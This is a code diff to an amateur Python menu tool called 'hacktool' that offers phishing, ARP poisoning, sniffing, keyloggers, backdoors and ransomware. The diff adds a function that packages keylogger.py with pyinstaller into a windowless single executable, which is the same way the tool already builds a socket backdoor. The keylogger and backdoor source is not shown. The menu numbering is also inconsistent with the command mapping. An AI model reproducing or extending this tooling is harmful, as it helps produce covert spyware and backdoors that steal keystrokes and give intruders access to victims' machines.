@@ -10,15 +10,16 @@ a = """
     Welcome to hacktool
 
 1-)Phishing
-2-)Arp_posion
+2-)Arpposion
 3-)Netscanner
 4-)sniff
-5-)Keyloger
-6-)Backdoor
-7-)Hack connection console
-8-)Ransomware
-9-)Changemac
-10-)Backdoor
+5-)Keyloger from smtp
+6-)Keyloger from ip
+7-)Backdoor
+8-)connection console
+9-)Ransomware
+10-)Changemac
+11-)Backdoor
 example: use 1
 
 """
@@ -56,6 +57,9 @@ def sniff():
 def Backdoor():
     sb.call(["pyinstaller","--onefile","-w","Bacdoor/my_socket.py"])
     
+def keylogger():
+    sb.call(["pyinstaller","--onefile","-w","keylogger.py"])
+
 while True:
     print(a)
     user_input = input("input:")
@@ -73,6 +77,8 @@ while True:
             Listen()
         elif user_input == 'use 10':
             Backdoor()
+        elif user_input == 'use 5':
+            keylogger()
         elif user_input == 'exit' or user_input == 'EXIT':
             exit()
     except AttributeError:
